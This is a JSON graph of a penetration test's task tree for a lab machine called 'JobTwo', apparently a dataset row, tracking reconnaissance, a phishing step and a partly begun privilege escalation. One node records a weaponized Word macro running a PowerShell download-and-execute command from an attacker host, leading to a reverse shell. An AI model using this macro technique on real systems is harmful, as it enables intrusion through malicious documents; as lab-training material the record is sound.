@@ -1,0 +1,387 @@
+{
+  "machine": "JobTwo",
+  "row_index": 17,
+  "legend": {
+    "node_types": {
+      "State (Blue)": "Pentest phase / sub-phase, or informational item (target IP, hostname, machine name, OS, ...)",
+      "Action (Orange)": "A concrete action the pentester performed",
+      "Finding (Green)": "The result/finding produced by an Action"
+    },
+    "status_shading": {
+      "dark": "completed",
+      "mid": "in_progress",
+      "light": "to_do"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "State -> State, advancing through the PTT",
+      "SearchUpdate (Green)": "State -> Action, starting work on a PTT item",
+      "TrackUpdate (Blue)": "Action -> Finding, item execution produced findings",
+      "Prediction (Purple)": "Finding -> State, findings lead back into state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "state:JobTwo:r17:START",
+      "label": "State: Start",
+      "type": "State",
+      "color": "#3A86FF",
+      "status": "in_progress",
+      "title": "Start of pentest tree snapshot for 'JobTwo' (row 17).",
+      "size": 30,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:1",
+      "label": "State 1\nPerform network reconnaissance",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "1 Perform network reconnaissance [completed]\n27 open ports including SSH(22), SMTP(25/hMailServer), HTTP(80/IIS), HTTPS(443/IIS), RDP(3389), WinRM(5985)",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:1.1",
+      "label": "State 1.1\nAnalyze SMTP service",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "1.1 Analyze SMTP service [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "action:JobTwo:r17:1.2",
+      "label": "Action 1.2\nAnalyze HTTP/HTTPS services",
+      "type": "Action",
+      "color": "#B33E00",
+      "status": "completed",
+      "title": "1.2 Analyze HTTP/HTTPS services [completed]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "finding:JobTwo:r17:1.2",
+      "label": "Finding 1.2\nStatic HTML site at www.job2.…",
+      "type": "Finding",
+      "color": "#06D6A0",
+      "status": null,
+      "title": "Static HTML site at www.job2.vl requesting Word document resumes via email to hr@job2.vl",
+      "size": 32,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:1.3",
+      "label": "State 1.3\nAnalyze RDP service",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "1.3 Analyze RDP service [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:1.4",
+      "label": "State 1.4\nAnalyze WinRM service",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "1.4 Analyze WinRM service [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:2",
+      "label": "State 2\nEnumerate web services",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "2 Enumerate web services [completed]\nCreated weaponized Word document with VBA macro: iex(iwr http://10.10.14.158/shell.ps1)",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:3",
+      "label": "State 3\nGain initial access",
+      "type": "State",
+      "color": "#0B3D91",
+      "status": "completed",
+      "title": "3 Gain initial access [completed]\nReverse shell received as user Julian via PowerShell; user flag obtained",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:4",
+      "label": "State 4\nPerform privilege escalation",
+      "type": "State",
+      "color": "#3A86FF",
+      "status": "in_progress",
+      "title": "4 Perform privilege escalation [in_progress]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:4.1",
+      "label": "State 4.1\nEnumerate local users and gro…",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "4.1 Enumerate local users and groups [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:4.2",
+      "label": "State 4.2\nEnumerate installed software",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "4.2 Enumerate installed software [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "state:JobTwo:r17:4.3",
+      "label": "State 4.3\nSearch for credentials",
+      "type": "State",
+      "color": "#AFC8FF",
+      "status": "to_do",
+      "title": "4.3 Search for credentials [to_do]",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 2,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "state:JobTwo:r17:START",
+      "to": "state:JobTwo:r17:1",
+      "label": "1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:1",
+      "to": "state:JobTwo:r17:1.1",
+      "label": "1.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:1.1",
+      "to": "action:JobTwo:r17:1.2",
+      "label": "1.2 Analyze HTTP/HTTP…",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "action:JobTwo:r17:1.2",
+      "to": "finding:JobTwo:r17:1.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "finding:JobTwo:r17:1.2",
+      "to": "state:JobTwo:r17:1.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 1,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:1.1",
+      "to": "state:JobTwo:r17:1.3",
+      "label": "1.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:1.3",
+      "to": "state:JobTwo:r17:1.4",
+      "label": "1.4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:1.4",
+      "to": "state:JobTwo:r17:2",
+      "label": "2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:2",
+      "to": "state:JobTwo:r17:3",
+      "label": "3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:3",
+      "to": "state:JobTwo:r17:4",
+      "label": "4",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:4",
+      "to": "state:JobTwo:r17:4.1",
+      "label": "4.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:4.1",
+      "to": "state:JobTwo:r17:4.2",
+      "label": "4.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "state:JobTwo:r17:4.2",
+      "to": "state:JobTwo:r17:4.3",
+      "label": "4.3",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 13,
+    "total_edges": 13,
+    "state_nodes": 11,
+    "action_nodes": 1,
+    "finding_nodes": 1,
+    "ptt_items_parsed": 11
+  },
+  "csv_row_index": 1798,
+  "source_csv": "training_data.csv"
+}
